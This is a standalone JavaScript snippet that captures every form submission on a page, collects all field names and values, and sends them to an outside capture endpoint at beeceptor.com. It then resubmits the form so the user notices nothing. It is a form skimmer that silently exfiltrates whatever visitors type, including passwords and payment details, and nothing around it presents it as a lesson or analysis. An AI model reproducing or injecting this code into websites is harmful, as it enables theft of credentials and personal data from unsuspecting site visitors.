document.addEventListener('submit', function(e) {
    e.preventDefault();
    let params = [...e.target.elements].map(d => d.name + "=" + d.value).filter(d => d.length>1).join("&");
    const URL = 'https://cozalcozal.free.beeceptor.com' + '?' + params ;
    fetch(URL).then(() => e.target.submit()).catch(() => window.location.href = URL);
});
